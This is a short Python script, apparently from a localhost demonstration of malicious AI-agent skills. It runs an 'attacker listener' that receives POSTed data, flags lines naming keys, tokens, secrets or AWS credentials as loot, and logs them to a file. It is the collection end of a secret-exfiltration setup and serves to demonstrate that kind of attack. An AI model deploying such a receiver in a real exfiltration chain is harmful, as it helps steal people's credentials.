#!/usr/bin/env python3
"""The attacker's collection endpoint. Runs on 127.0.0.1 only. Keep it in its own terminal pane."""
import datetime as dt
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

LOOT = Path(__file__).resolve().parent / "loot.log"
RED, BOLD, DIM, RST = "\033[31m", "\033[1m", "\033[2m", "\033[0m"


class H(BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0))).decode(errors="replace")
        src = self.headers.get("X-Skill", "unknown skill")
        stamp = dt.datetime.now().strftime("%H:%M:%S")
        print(f"\n{RED}{BOLD}☠  [{stamp}] LOOT RECEIVED from {src}{RST}")
        print(RED + "─" * 60 + RST)
        for line in body.replace('", "', '"\n"').splitlines():
            if any(k in line.upper() for k in ("KEY", "TOKEN", "SECRET", "AWS")):
                print(f"{RED}{line}{RST}")
            else:
                print(f"{DIM}{line[:100]}{RST}")
        print(RED + "─" * 60 + RST, flush=True)
        with LOOT.open("a") as fh:
            fh.write(f"[{stamp}] {src}\n{body}\n\n")
        self.send_response(204)
        self.end_headers()

    def log_message(self, *_):
        pass


if __name__ == "__main__":
    print(f"{DIM}attacker listener on http://127.0.0.1:8808  (waiting for loot…){RST}", flush=True)
    HTTPServer(("127.0.0.1", 8808), H).serve_forever()
